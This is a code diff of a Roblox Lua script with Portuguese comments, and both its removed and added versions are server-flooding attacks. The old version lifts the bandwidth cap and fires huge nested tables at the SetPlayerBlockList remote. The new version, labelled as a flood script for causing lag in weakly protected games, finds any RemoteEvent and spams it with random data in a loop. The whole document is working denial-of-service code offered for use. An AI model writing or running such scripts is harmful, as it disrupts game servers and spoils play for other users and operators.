@@ -1,40 +1,32 @@
--- Script potente, use por sua conta e risco!
-while wait(0.1) do -- Aumentei a frequência para 0.1 segundos
-    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-
-    local function getmaxvalue(val)
-        local mainvalueifonetable = 999999 -- Aumentei o valor para criar tabelas maiores
-        if type(val) ~= "number" then
-            return nil
+-- Script de Flood para causar lag em jogos menos protegidos
+while wait(0.1) do
+    -- Função para encontrar um evento remoto
+    local function findRemote()
+        for _, service in pairs(game:GetChildren()) do
+            for _, child in pairs(service:GetChildren()) do
+                if child:IsA("RemoteEvent") then
+                    return child
+                end
+            end
         end
-        local calculateperfectval = (mainvalueifonetable / (val + 1))
-        return calculateperfectval
+        return nil
     end
 
-    local function bomb(tableincrease, tries)
-        local maintable = {}
-        local spammedtable = {}
+    local remote = findRemote()
+    if not remote then
+        warn("Nenhum evento remoto encontrado. O script não funcionará.")
+        break
+    end
 
-        table.insert(spammedtable, {})
-        local z = spammedtable[1]
-
-        for i = 1, tableincrease * 2 do -- Aumentei a profundidade da tabela
-            local tableins = {}
-            table.insert(z, tableins)
-            z = tableins
+    local function floodServer()
+        local spamTable = {}
+        for i = 1, 1000 do
+            table.insert(spamTable, {math.random(), math.random()})
         end
-
-        local calculatemax = getmaxvalue(tableincrease)
-        local maximum = calculatemax or 1999999 -- Limite aumentado
-
-        for i = 1, maximum do
-            table.insert(maintable, spammedtable)
-        end
-
-        for i = 1, tries * 5 do -- Aumentei o número de tentativas
-            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+        for i = 1, 10 do
+            remote:FireServer(spamTable)
         end
     end
 
-    bomb(500, 10) -- Valores aumentados para mais impacto
+    floodServer()
 end
